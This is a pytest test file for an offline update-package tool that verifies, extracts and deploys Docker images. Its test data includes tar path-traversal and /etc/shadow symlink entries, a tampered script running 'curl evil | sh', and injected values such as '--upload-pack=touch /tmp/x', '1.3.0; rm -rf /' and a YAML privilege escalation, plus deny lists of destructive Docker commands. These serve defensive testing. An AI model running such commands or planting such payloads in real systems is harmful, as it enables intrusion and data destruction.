    assert OP.same_image(IMAGE_ID, [], image) == "image id"
    assert "layer" in OP.same_image("sha256:" + "9" * 64, image["diff_ids"], image)
    assert OP.same_image("sha256:" + "9" * 64, ["sha256:" + "1" * 64], image) is None
    assert OP.same_image("sha256:" + "9" * 64, [], image) is None


def _evil_tar(tmp_path, build):
    path = tmp_path / "evil.tar.gz"
    with tarfile.open(path, "w:gz") as t:
        build(t)
    return path


def _add(t, name, data=b"x", **kw):
    info = tarfile.TarInfo(name)
    info.size = len(data)
    for k, v in kw.items():
        setattr(info, k, v)
    t.addfile(info, io.BytesIO(data) if info.isfile() else None)


@pytest.mark.parametrize(
    "case",
    ["traversal", "absolute", "symlink", "hardlink", "two_tops", "device", "fifo",
     "duplicate", "duplicate_dir_file", "backslash", "dot_segment"],
)  # fmt: skip
def test_archive_safety(tmp_path, case):
    def build(t):
        _add(t, "pkg/manifest.json", b"{}")
        if case == "traversal":
            _add(t, "pkg/../../etc/cron.d/x")
        elif case == "absolute":
            _add(t, "/etc/passwd")
        elif case == "symlink":
            _add(t, "pkg/link", b"", type=tarfile.SYMTYPE, linkname="/etc/shadow")
        elif case == "hardlink":
            _add(t, "pkg/hard", b"", type=tarfile.LNKTYPE, linkname="pkg/manifest.json")
        elif case == "two_tops":
            _add(t, "other/file")
        elif case == "device":
            _add(t, "pkg/dev", b"", type=tarfile.CHRTYPE)
        elif case == "fifo":
            _add(t, "pkg/fifo", b"", type=tarfile.FIFOTYPE)
        elif case == "duplicate":
            _add(t, "pkg/scripts/update.sh", b"first")
            _add(t, "pkg/scripts/update.sh", b"second")
        elif case == "duplicate_dir_file":
            _add(t, "pkg/scripts", b"", type=tarfile.DIRTYPE)
            _add(t, "pkg/scripts/", b"x")
        elif case == "backslash":
            _add(t, "pkg/..\\..\\x")
        elif case == "dot_segment":
            _add(t, "pkg/./manifest.json")

    pkg = _evil_tar(tmp_path, build)
    dest = tmp_path / "out"
    with pytest.raises(OP.Refused):
        OP.safe_extract(pkg, dest)
    assert not (tmp_path / "etc").exists()
    assert not dest.exists()
    assert not list(tmp_path.glob("out.partial-*"))


def test_archive_bomb_refused(tmp_path, monkeypatch):
    def build(t):
        _add(t, "pkg/zeros", b"\0" * (5 * 1024 * 1024))

    pkg = _evil_tar(tmp_path, build)
    with pytest.raises(OP.Refused, match="compression ratio"):
        OP.safe_extract(pkg, tmp_path / "out")
    monkeypatch.setattr(OP, "MAX_TOTAL_BYTES", 1024)
    monkeypatch.setattr(OP, "MAX_RATIO", 1e9)
    with pytest.raises(OP.Refused, match="expands beyond"):
        OP.safe_extract(pkg, tmp_path / "out2")
    monkeypatch.setattr(OP, "MAX_MEMBERS", 0)
    with pytest.raises(OP.Refused, match="too many"):
        OP.safe_extract(pkg, tmp_path / "out3")


def test_extraction_checks_free_space_first(package, tmp_path, monkeypatch):
    pkg, _ = package
    usage = collections.namedtuple("usage", "total used free")
    monkeypatch.setattr(OP.shutil, "disk_usage", lambda p: usage(10**9, 10**9, 1024))
    with pytest.raises(OP.Refused, match="free space"):
        OP.safe_extract(pkg, tmp_path / "out")
    assert not (tmp_path / "out").exists()


def test_failed_extraction_leaves_no_partial_tree(package, tmp_path, monkeypatch):
    """F-14: disk full / I/O error in the middle -> a refusal, not a traceback, no leftovers."""
    pkg, digest = package
    real_chmod = os.chmod
    seen = []

    def failing_chmod(path, mode):
        seen.append(path)
        if len(seen) == 3:
            raise OSError(28, "No space left on device")
        return real_chmod(path, mode)

    monkeypatch.setattr(OP.os, "chmod", failing_chmod)
    assert _verify(pkg, tmp_path / "x", "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert not (tmp_path / "x").exists()
    assert not list(tmp_path.glob("x.partial-*"))
    assert not (tmp_path / "verify-report.json").exists()


def test_extract_refuses_a_non_empty_destination(package, tmp_path):
    pkg, digest = package
    dest = tmp_path / "x"
    dest.mkdir()
    (dest / "old").write_text("x")
    assert _verify(pkg, dest, "--expected-sha256", digest) == OP.EXIT_VERIFY
    assert (dest / "old").read_text() == "x"


needs_ssh_keygen = pytest.mark.skipif(
    shutil.which("ssh-keygen") is None, reason="ssh-keygen not installed"
)


@pytest.fixture
def signing(tmp_path):
    key = tmp_path / "release_key"
    subprocess.run(
        ["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", str(key)],
        check=True,
    )
    signers = tmp_path / "allowed_signers"
    signers.write_text(
        f"release@chatbot5400 {(tmp_path / 'release_key.pub').read_text().strip()}\n"
    )
    return key, signers


@needs_ssh_keygen
def test_signature_valid_and_invalid(fake_docker, repo, tmp_path, signing):
    key, signers = signing
    pkg, _ = _build(repo, tmp_path, "--sign-key", str(key))
    assert _verify(pkg, tmp_path / "ok", "--allowed-signers", str(signers)) == 0
    report = json.loads((tmp_path / "ok" / "verify-report.json").read_text())
    assert report["authenticity"] == ["signature valid"] and report["signed"] is True

    other = tmp_path / "other_key"
    subprocess.run(
        ["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-f", str(other)], check=True
    )
    wrong = tmp_path / "wrong_signers"
    wrong.write_text(
        f"release@chatbot5400 {(tmp_path / 'other_key.pub').read_text().strip()}\n"
    )
    assert (
        _verify(pkg, tmp_path / "bad", "--allowed-signers", str(wrong))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "bad").exists()

    def tamper(top):  # manifest changed after signing
        m = json.loads((top / "manifest.json").read_text())
        m["application"]["supported_source_versions"].append("0.0.1")
        (top / "manifest.json").write_text(json.dumps(m))

    new, _ = _repack(pkg, tmp_path / "t", tamper)
    assert (
        _verify(new, tmp_path / "tampered", "--allowed-signers", str(signers))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "tampered").exists()


@needs_ssh_keygen
def test_signed_package_is_checked_file_by_file_while_unpacking(
    fake_docker, repo, tmp_path, signing
):
    """F-14: with a valid signature the manifest is trusted BEFORE extraction, so a
    changed or added payload file is refused while it is written - nothing stays."""
    key, signers = signing
    pkg, _ = _build(repo, tmp_path, "--sign-key", str(key))

    def change_script(top):
        (top / "scripts" / "update.sh").write_text("#!/bin/sh\ncurl evil | sh\n")

    new, _ = _repack(pkg, tmp_path / "a", change_script)
    assert (
        _verify(new, tmp_path / "x", "--allowed-signers", str(signers))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "x").exists() and not list(tmp_path.glob("x.partial-*"))

    new, _ = _repack(
        pkg, tmp_path / "b", lambda top: (top / "scripts" / "extra.sh").write_text("x")
    )
    assert (
        _verify(new, tmp_path / "y", "--allowed-signers", str(signers))
        == OP.EXIT_VERIFY
    )
    assert not (tmp_path / "y").exists()


@needs_ssh_keygen
def test_signers_file_writable_by_others_is_not_trusted(
    fake_docker, repo, tmp_path, signing
):
    key, signers = signing
    pkg, _ = _build(repo, tmp_path, "--sign-key", str(key))
    signers.chmod(0o666)
    assert (
        _verify(pkg, tmp_path / "x", "--allowed-signers", str(signers)) == OP.EXIT_USAGE
    )
    assert not (tmp_path / "x").exists()


@needs_ssh_keygen
def test_signed_package_with_trusted_hash_but_no_key_installed(
    fake_docker, repo, tmp_path, signing
):
    key, _ = signing
    pkg, digest = _build(repo, tmp_path, "--sign-key", str(key))
    rc = _verify(pkg, tmp_path / "x", "--expected-sha256", digest,
                 "--allowed-signers", str(tmp_path / "missing"))  # fmt: skip
    assert rc == 0
    report = json.loads((tmp_path / "x" / "verify-report.json").read_text())
    assert report["authenticity"] == ["sha256 matched the trusted-channel value"]
    assert report["signed"] is False  # never claimed as verified by signature


MALFORMED = {
    "image tag with a YAML payload": lambda m: m["image"].update(
        tag="chatbot5400:1.3.0\n    privileged: true"
    ),
    "image tag without a tag": lambda m: m["image"].update(tag="chatbot5400"),
    "image tag as an option": lambda m: m["image"].update(tag="--privileged:x"),
    "image id not a digest": lambda m: m["image"].update(id="abc"),
    "config digest not a digest": lambda m: m["image"].update(
        config_digest="sha256:xyz"
    ),
    "layer list invalid": lambda m: m["image"].update(diff_ids=["layer1"]),
    "repo tags differ from the tag": lambda m: m["image"].update(
        repo_tags=[m["image"]["tag"], "x:y"]
    ),
    "commit as an option": lambda m: m["source"].update(
        commit="--upload-pack=touch /tmp/x"
    ),
    "commit abbreviated": lambda m: m["source"].update(commit="abc1234"),
    "base commit missing": lambda m: m["source"].pop("base_commit"),
    "bundle ref outside our namespace": lambda m: m["source"].update(
        bundle_ref="refs/heads/main"
    ),
    "bundle ref wildcard": lambda m: m["source"].update(
        bundle_ref="refs/cb5400-offline/build/*"
    ),
    "release tag as an option": lambda m: m["application"].update(release_tag="-d"),
    "version with shell text": lambda m: m["application"].update(
        version="1.3.0; rm -rf /"
    ),
    "supported versions invalid": lambda m: m["application"].update(
        supported_source_versions=["1.2.0 x"]
    ),
    "supported versions empty": lambda m: m["application"].update(
        supported_source_versions=[]
    ),
    "schema version as text": lambda m: m["database"].update(schema_version="33"),
    "file path traversal": lambda m: m["files"].update(
        {"../x": {"sha256": "0" * 64, "size": 1}}
    ),
    "file checksum invalid": lambda m: m["files"].update(
        {"scripts/a": {"sha256": "zz", "size": 1}}
    ),
    "format version 1": lambda m: m.update(package_format_version=1),
    "secret in the manifest": lambda m: m["build"].update(note="password=hunter2"),
}


@pytest.mark.parametrize("case", sorted(MALFORMED))
def test_manifest_fields_are_format_checked(package, case):
    """F-12: every value that reaches YAML, git or docker has a checked shape."""
    pkg, _ = package
    manifest = _manifest_of(pkg)
    OP.validate_manifest(copy.deepcopy(manifest))  # the real one is valid
    MALFORMED[case](manifest)
    with pytest.raises(OP.Refused):
        OP.validate_manifest(manifest)


# --------------------------------------------------------------------------- #
# a fake deployment
# --------------------------------------------------------------------------- #


@pytest.fixture
def health_server():
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}/health"
    srv.shutdown()


def _write_conf(tmp_path, deploy, health, **extra):
    maint = tmp_path / "docker-compose.maintenance.yml"
    maint.write_text("services: {}\n")
    conf = tmp_path / "offline-update.conf"
    values = {
        "DEPLOY_DIR": deploy,
        "COMPOSE_PROJECT": "cb-test",
        "COMPOSE_FILES": "docker-compose.yml",
        "STATE_DIR": tmp_path / "state",
        "MAINTENANCE_OVERRIDE": maint,
        "HEALTH_URL": health,
        "MIN_FREE_GB_EXTRA": "0",
        **extra,
    }
    conf.write_text("".join(f"{k}={v}\n" for k, v in values.items()))
    return conf


def _set_conf(conf, **values):
    lines = [
        x for x in conf.read_text().splitlines() if x.split("=", 1)[0] not in values
    ]
    conf.write_text("\n".join(lines + [f"{k}={v}" for k, v in values.items()]) + "\n")


def _unpack_on_server(fake, pkg, digest, dest):
    assert _verify(pkg, dest, "--expected-sha256", digest) == 0
    fake.forget_image(
        _manifest_of(pkg)["image"]["tag"]
    )  # the server only gets it by `docker load`
    return next(p for p in dest.iterdir() if p.is_dir())


@pytest.fixture
def deployment(tmp_path, package, fake_docker, health_server, monkeypatch):
    pkg, digest = package
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    (deploy / "docker-compose.yml").write_text("services: {}\n")
    (deploy / ".env").write_text("SURREAL_PASSWORD=do-not-read\n")
    conf = _write_conf(tmp_path, deploy, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    return conf, pkg_dir, deploy


def _server(cmd, conf, pkg_dir, *extra):
    return OP.main([cmd, "--config", str(conf), "--package-dir", str(pkg_dir), *extra])


def _apply(conf, pkg_dir, *extra):
    return _server("update", conf, pkg_dir, "--apply", "--backup-reference", "bk", "--backup-verified", *extra)  # fmt: skip


def _finish(conf):
    return OP.main(["finish", "--config", str(conf), "--approve", "owner"])


def _rollback(conf, what="app", *extra):
    return OP.main(["rollback", what, "--config", str(conf), *extra])


def _status(conf):
    return OP.main(["status", "--config", str(conf)])


def _journal(tmp_path):
    return json.loads((tmp_path / "state" / "journal.json").read_text())


def _ups(fake, start=0):
    return [c for c in fake.calls()[start:] if c[0] == "compose" and "up" in c]


def _plain_compose_up(deploy, *files):
    """What an operator, a cron job or a boot script does: no override of ours."""
    cmd = ["docker", "compose", "-p", "cb-test", "--project-directory", str(deploy)]
    for f in files or ("docker-compose.yml",):
        cmd += ["-f", str(deploy / f)]
    subprocess.run(cmd + ["up", "-d"], check=True)


SAFE_UP_TAIL = [
    "up", "-d", "--no-deps", "--no-build", "--pull", "never", "--force-recreate", "open_notebook",
]  # fmt: skip
ALLOWED_DOCKER = {"image", "info", "load", "tag", "inspect", "run", "save", "compose"}
ALLOWED_COMPOSE = {"config", "ps", "exec", "up"}


def _compose_verb(call):
    """The compose sub-command: the first token after the global options."""
    i = 1
    while i < len(call):
        if call[i] in (
            "-p",
            "-f",
            "--project-directory",
            "--project-name",
            "--file",
            "--env-file",
        ):
            i += 2
        elif call[i].startswith("-"):
            i += 1
        else:
            return call[i], call[i:]
    return None, []


def _assert_safe_calls(calls):
    """Every recorded Docker call is one the update tool may make (T-02).

    Each condition is its own assert: no `A and B or C`. A compose call may only
    be config / ps / exec / up, and `up` must be EXACTLY the app-only recreate:
    --no-deps --no-build --pull never, nothing else, never the database.
    """
    for c in calls:
        assert c[0] in ALLOWED_DOCKER, c
        if c[0] != "compose":
            continue
        verb, tail = _compose_verb(c)
        assert verb in ALLOWED_COMPOSE, c
        for forbidden in (
            "down",
            "pull",
            "build",
            "prune",
            "rm",
            "restart",
            "stop",
            "kill",
            "create",
            "run",
        ):
            assert verb != forbidden, c
        assert "-v" not in c, c
        assert "--volumes" not in c, c
        assert "--build" not in c, c
        assert "--remove-orphans" not in c, c
        if verb == "up":
            assert tail == SAFE_UP_TAIL, c
        if verb == "exec":
            assert tail[1:3] == ["-T", "open_notebook"], c  # never inside the database


def test_safe_calls_oracle_can_fail():
    """The oracle rejects each dangerous form on its own."""
    base = ["compose", "-p", "x", "-f", "docker-compose.yml"]
    up = ["up", "-d", "--no-deps", "--no-build", "--pull", "never", "--force-recreate"]
    dangerous = [
        base + ["down", "--pull", "never"],
        base + ["down"],
        base + ["pull"],
        base + ["build"],
        base
        + [
            "up",
            "-d",
            "--no-build",
            "--pull",
            "never",
            "--force-recreate",
            "open_notebook",
        ],
        base
        + [
            "up",
            "-d",
            "--no-deps",
            "--pull",
            "never",
            "--force-recreate",
            "open_notebook",
        ],
        base
        + ["up", "-d", "--no-deps", "--no-build", "--force-recreate", "open_notebook"],
        base
        + [
            "up",
            "-d",
            "--no-deps",
            "--no-build",
            "--pull",
            "always",
            "--force-recreate",
            "open_notebook",
        ],
        base + up + ["surrealdb"],
        base + up + ["open_notebook", "surrealdb"],
        base + up + ["-v", "open_notebook"],
        base + up,  # every service
        base + ["up", "-d"],
        base + ["rm", "-f", "open_notebook"],
        base + ["exec", "-T", "surrealdb", "sh"],
        ["system", "prune", "-f"],
        ["volume", "rm", "data"],
        ["pull", "chatbot5400:1.3.0"],
        ["rmi", "chatbot5400:local"],
    ]
    for call in dangerous:
        with pytest.raises(AssertionError):
            _assert_safe_calls([call])
    _assert_safe_calls(
        [
            base + SAFE_UP_TAIL,
            base + ["config", "--format", "json"],
            ["load", "-i", "x.tar"],
        ]
    )


def test_tool_source_has_no_destructive_or_wildcard_commands():
    text = (ROOT / "scripts" / "offline" / "offline_package.py").read_text()
    code = "\n".join(
        line for line in text.splitlines() if not line.strip().startswith(("#", '"'))
    )
    for forbidden in ('"down"', '"pull"', '"prune"', '"rm"', '"rmi"', '"--volumes"', '"restart"',
                      '"reset"', '"--hard"', '"--force"', '"clean"', '"push"', "refs/*", '"+refs'):  # fmt: skip
        assert forbidden not in code, forbidden
    assert ".env" not in "\n".join(
        line for line in code.splitlines() if "open(" in line or "read_text" in line
    )


def test_wrapper_scripts_only_delegate():
    for name in ("verify-package.sh", "preflight.sh", "update.sh", "rollback.sh",
                 "healthcheck.sh", "finish.sh", "status.sh", "pin.sh"):  # fmt: skip
        text = (ROOT / "scripts" / "offline" / name).read_text()
        code = "\n".join(x for x in text.splitlines() if not x.startswith("#"))
        assert "exec python3" in code and "rm -" not in code and "down" not in code


# --------------------------------------------------------------------------- #
# configuration and package trust on the server (F-26)
# --------------------------------------------------------------------------- #


def test_config_writable_by_others_is_refused(deployment):
    conf, _, _ = deployment
    conf.chmod(0o666)
    assert _status(conf) == OP.EXIT_USAGE
    conf.chmod(0o644)
    assert _status(conf) == 0


def test_config_keys_cannot_be_replaced_through_the_environment(
    deployment, monkeypatch, tmp_path
):
    conf, _, _ = deployment
    monkeypatch.setenv("CB5400_BACKUP_CMD", f"touch {tmp_path / 'owned'}")
    monkeypatch.setenv("CB5400_DEPLOY_DIR", "/somewhere/else")
    cfg = OP.load_config(str(conf))
    assert cfg["BACKUP_CMD"] == "" and cfg["DEPLOY_DIR"] != "/somewhere/else"


def test_package_changed_after_verification_is_refused(deployment):
    """F-26a: the verify report is bound to the manifest; a later edit is noticed."""
    conf, pkg_dir, _ = deployment
    manifest_path = pkg_dir / "manifest.json"
    m = json.loads(manifest_path.read_text())
    m["application"]["supported_source_versions"].append("0.9.0")
    manifest_path.write_text(json.dumps(m))
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )

    (pkg_dir.parent / "verify-report.json").unlink()
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_payload_changed_after_verification_is_refused(deployment):
    conf, pkg_dir, _ = deployment
    (pkg_dir / "scripts" / "update.sh").write_text("#!/bin/sh\nexit 0\n")
    assert _server("update", conf, pkg_dir, "--backup-reference", "x") == OP.EXIT_VERIFY


def test_report_of_another_package_is_not_accepted(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    other = tmp_path / "elsewhere" / pkg_dir.name
    shutil.copytree(pkg_dir, other)
    shutil.copy2(
        pkg_dir.parent / "verify-report.json", other.parent / "verify-report.json"
    )
    assert (
        _server("preflight", conf, other, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_health_request_never_goes_through_a_proxy(deployment, monkeypatch):
    """F-26d: http_proxy in root's shell must not break (or leak) the loopback check."""
    conf, _, _ = deployment
    for name in ("http_proxy", "HTTP_PROXY", "all_proxy", "ALL_PROXY"):
        monkeypatch.setenv(name, "http://127.0.0.1:9")
    for name in ("no_proxy", "NO_PROXY"):
        monkeypatch.delenv(name, raising=False)
    assert OP.main(["health", "--config", str(conf)]) == 0


def test_health_url_must_be_loopback(deployment):
    conf, _, _ = deployment
    _set_conf(conf, HEALTH_URL="http://example.com/health")
    assert OP.main(["health", "--config", str(conf)]) == OP.EXIT_UPDATE


# --------------------------------------------------------------------------- #
# preflight
# --------------------------------------------------------------------------- #


def test_preflight_is_read_only(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    before = len(fake_docker.calls())
    assert _server("preflight", conf, pkg_dir, "--backup-reference", "bk-1") == 0
    new = fake_docker.calls()[before:]
    mutating = {"load", "tag", "rm", "rmi", "save", "push", "pull", "run"}
    assert not any(c[0] in mutating for c in new)
    assert not _ups(fake_docker, before)
    _assert_safe_calls(new)
    assert not (Path(str(conf)).parent / "state" / "journal.json").exists()


def test_preflight_fails_closed(deployment, fake_docker):
    conf, pkg_dir, _ = deployment

    def preflight(*extra):
        return _server("preflight", conf, pkg_dir, "--backup-reference", "x", *extra)

    fake_docker.set(jobs=2)
    assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.set(jobs=0, schema=32)
    assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.set(schema=33, version="1.0.8", versions={})
    assert preflight() == OP.EXIT_PREFLIGHT
    fake_docker.set(versions={OLD_ID: "1.2.0"})
    assert preflight() == 0
    assert (
        _server("preflight", conf, pkg_dir) == OP.EXIT_PREFLIGHT
    )  # no backup procedure


def test_preflight_requires_recorded_offline_readiness(deployment, fake_docker):
    """F-22: Heron / TableFormer / OCR models / Agri must be usable offline in the
    CURRENT container before it is replaced."""
    conf, pkg_dir, _ = deployment
    fake_docker.set(fail=["ocr.cli readiness$"])
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )
    rc = _server(
        "preflight",
        conf,
        pkg_dir,
        "--backup-reference",
        "x",
        "--accept-missing-artifacts",
    )
    assert rc == 0


def test_preflight_refuses_a_tag_that_points_to_another_image(deployment, fake_docker):
    """F-25: the package's tag already exists on the server as a different image."""
    conf, pkg_dir, _ = deployment

    def collide(s):
        s["images"][TARGET] = OTHER_ID
        s["image_configs"][OTHER_ID] = OTHER_CONFIG

    fake_docker.edit(collide)
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_preflight_needs_the_database_container(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    fake_docker.edit(lambda s: s["containers"].pop("db1"))
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )


def test_preflight_refuses_a_not_ready_package(
    fake_docker, repo, tmp_path, health_server, monkeypatch
):
    fake_docker.edit(
        lambda s: s["inventory"]["runtimes_baked"].update(tiktoken_offline=False)
    )
    pkg, digest = _build(repo, tmp_path)
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    deploy = tmp_path / "deploy"
    deploy.mkdir()
    conf = _write_conf(tmp_path, deploy, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    assert (
        _server("preflight", conf, pkg_dir, "--backup-reference", "x")
        == OP.EXIT_PREFLIGHT
    )
    assert (
        _server(
            "preflight", conf, pkg_dir, "--backup-reference", "x", "--accept-not-ready"
        )
        == 0
    )


# --------------------------------------------------------------------------- #
# update / finish / rollback
# --------------------------------------------------------------------------- #


def test_update_dry_run_changes_nothing(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    before = len(fake_docker.calls())
    assert _server("update", conf, pkg_dir, "--backup-reference", "bk") == 0
    assert not any(
        c[0] in ("load", "tag") or "up" in c for c in fake_docker.calls()[before:]
    )
    assert not (tmp_path / "state" / "journal.json").exists()


def test_update_apply_full_flow(deployment, fake_docker, tmp_path):
    conf, pkg_dir, deploy = deployment
    start = len(fake_docker.calls())
    assert _apply(conf, pkg_dir) == 0
    calls = fake_docker.calls()[start:]
    _assert_safe_calls(calls)
    kinds = [c[0] for c in calls]
    assert kinds.index("load") < kinds.index("tag")
    tag_call = next(c for c in calls if c[0] == "tag")
    assert tag_call[1] == OLD_ID and tag_call[2].startswith("chatbot5400:rollback-")
    ups = _ups(fake_docker, start)
    assert len(ups) == 1 and any("maintenance" in x for x in ups[0])
    app = fake_docker.app()
    assert app["image_id"] == IMAGE_ID
    assert app["env"]["OCR_OFFLINE"] == "true" and app["env"]["SURREAL_URL"].startswith(
        "ws://"
    )
    assert app["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"  # maintenance
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"

    journal = _journal(tmp_path)
    assert journal["status"] == "awaiting_approval"
    assert journal["schema"] == 2 and journal["attempt_id"]
    assert journal["expected_image_id"] == IMAGE_ID
    assert journal["baseline"]["image_id"] == OLD_ID
    assert journal["baseline"]["db"]["container_id"] == "db-container-original"
    assert journal["baseline"]["counts"]["source"] == 120
    assert journal["baseline"]["schema"] == 33
    assert journal["compose_command"][-8:] == SAFE_UP_TAIL
    assert [s["step"] for s in journal["steps"]] == [
        "G_load", "H_rollback_tag", "I_backup", "J_backup_verified", "RAPIDOCR_weights",
        "ARTIFACTS_snapshot", "N_recreated", "O_P_checks",
    ]  # fmt: skip
    override = (tmp_path / "state" / "image-override.yml").read_text()
    assert f'image: "{TARGET}"' in override and "pull_policy: never" in override
    assert 'OCR_RAPIDOCR_PERSISTENT: "true"' in override
    assert (
        deploy / ".env"
    ).read_text() == "SURREAL_PASSWORD=do-not-read\n"  # untouched
    assert (deploy / "docker-compose.yml").read_text() == "services: {}\n"
    assert _status(conf) == 0

    # finish (approval) -> normal mode, health-checked, without the maintenance override
    assert OP.main(["finish", "--config", str(conf)]) == OP.EXIT_USAGE
    assert _finish(conf) == 0
    last_up = _ups(fake_docker)[-1]
    assert not any("maintenance" in x for x in last_up)
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    journal = _journal(tmp_path)
    assert journal["status"] == "completed" and journal["steps"][-1] == {
        "step": "Q_checks", "ok": True, "at": journal["steps"][-1]["at"],
    }  # fmt: skip
    command = (tmp_path / "state" / "compose-command.txt").read_text()
    assert "--no-deps --no-build --pull never --force-recreate open_notebook" in command
    assert str(tmp_path / "state" / "image-override.yml") in command
    assert _status(conf) == 0

    # rollback to the previous image, by its verified ID
    assert _rollback(conf, "app", "--package-dir", str(pkg_dir)) == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    assert _journal(tmp_path)["status"] == "rolled_back"
    _assert_safe_calls(fake_docker.calls()[start:])
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    assert _status(conf) == 0


def test_update_without_backup_refused_then_resumed(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    rc = _server(
        "update",
        conf,
        pkg_dir,
        "--apply",
        "--no-maintenance",
        "--backup-reference",
        "x",
    )
    assert rc == OP.EXIT_UPDATE  # restore not verified
    journal = _journal(tmp_path)
    assert journal["status"] == "in_progress"
    attempt = journal["attempt_id"]
    assert not _ups(fake_docker)
    loads = sum(1 for c in fake_docker.calls() if c[0] == "load")
    rc = _server("update", conf, pkg_dir, "--apply", "--no-maintenance",
                 "--backup-reference", "x", "--backup-verified")  # fmt: skip
    assert rc == 0
    assert (
        sum(1 for c in fake_docker.calls() if c[0] == "load") == loads
    )  # resumed, not reloaded
    assert _journal(tmp_path)["attempt_id"] == attempt  # the same transaction


def test_update_lock(deployment, tmp_path):
    conf, pkg_dir, _ = deployment
    with OP.update_lock(tmp_path / "state"):
        assert _apply(conf, pkg_dir) == OP.EXIT_LOCK
        assert _rollback(conf) == OP.EXIT_LOCK
        assert _finish(conf) == OP.EXIT_LOCK


def test_failed_health_keeps_maintenance_and_reports(deployment, fake_docker, tmp_path):
    conf, pkg_dir, _ = deployment
    # the readiness check fails in the NEW container only
    fake_docker.set(fail_on_image={IMAGE_ID: ["readiness --check"]})
    assert _apply(conf, pkg_dir) == OP.EXIT_UPDATE
    assert _journal(tmp_path)["status"] == "failed"
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    assert _finish(conf) == OP.EXIT_UPDATE  # a failed update cannot be approved
    assert _rollback(conf, "interrupted") == 0
    assert fake_docker.app()["image_id"] == OLD_ID
    assert _journal(tmp_path)["status"] == "rolled_back"


@pytest.mark.parametrize(
    "name", ["evil-db", "evil-app", "evil-env", "evil-volume", "evil-port"]
)
def test_unexpected_config_changes_are_refused(deployment, fake_docker, tmp_path, name):
    """F-12 / F-21: the override may change the image, pull_policy and the declared
    environment keys of the application - nothing else, anywhere."""
    conf, _, _ = deployment
    dep = OP.Deployment(OP.load_config(str(conf)))
    before = dep.config_json()
    good = OP.write_image_override(dep, "chatbot5400:local", {"OCR_OFFLINE": "true"})
    evil = tmp_path / f"{name}.yml"
    evil.write_text("x")
    OP.compare_configs(
        dep, before, dep.config_json([str(good)]), False, {"OCR_OFFLINE": "true"}
    )
    with pytest.raises(OP.Refused):
        OP.compare_configs(
            dep,
            before,
            dep.config_json([str(good), str(evil)]),
            False,
            {"OCR_OFFLINE": "true"},
        )


def test_override_values_are_checked_and_quoted(deployment):
    conf, _, _ = deployment
    dep = OP.Deployment(OP.load_config(str(conf)))
    text = OP.render_override(
        "open_notebook", "chatbot5400:1.3.0", {"OCR_OFFLINE": "true"}
    )
    assert 'image: "chatbot5400:1.3.0"' in text and 'OCR_OFFLINE: "true"' in text
    for image in (
        "chatbot5400:1.3.0\n    privileged: true",
        "a b:c",
        "-x:y",
        "",
        "x:y z",
        'x:"y"',
    ):
        with pytest.raises(OP.Refused):
            OP.write_image_override(dep, image, {})
    for env in (
        {"A": 'x"\n    privileged: "true'},
        {"bad key": "x"},
        {"A": "x y"},
        {"A": "$(id)"},
    ):
        with pytest.raises(OP.Refused):
            OP.render_override("open_notebook", "chatbot5400:1.3.0", env)
    with pytest.raises(OP.Refused):
        OP.render_override("open notebook:\n  x", "chatbot5400:1.3.0", {})
    # shapes a real deployment can report
    for ok in (
        "chatbot5400:local",
        "cb-test-open_notebook",
        "registry.local:5000/team/app:1.2.0",
        IMAGE_ID,
    ):
        OP.check_image_ref(ok)


# --- F-08: every attempt is its own transaction with its own backup ----------


def _with_backup_cmd(conf, tmp_path, verify="true"):
    marker = tmp_path / "backups.log"
    _set_conf(conf, BACKUP_CMD=f"echo backup >> {marker}", BACKUP_VERIFY_CMD=verify)
    return marker


def _backups(marker):
    return marker.read_text().count("backup") if marker.exists() else 0


def test_upgrade_rollback_then_upgrade_again_is_a_new_attempt(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    marker = _with_backup_cmd(conf, tmp_path)
    assert _server("update", conf, pkg_dir, "--apply") == 0
    first = _journal(tmp_path)
    assert _rollback(conf) == 0
    assert _backups(marker) == 1
    # users keep working: the data of the first backup is now stale
    fake_docker.edit(lambda s: s["counts"].update(source=150, note=40))
    assert _server("update", conf, pkg_dir, "--apply") == 0
    second = _journal(tmp_path)
    assert _backups(marker) == 2
    assert second["attempt_id"] != first["attempt_id"]
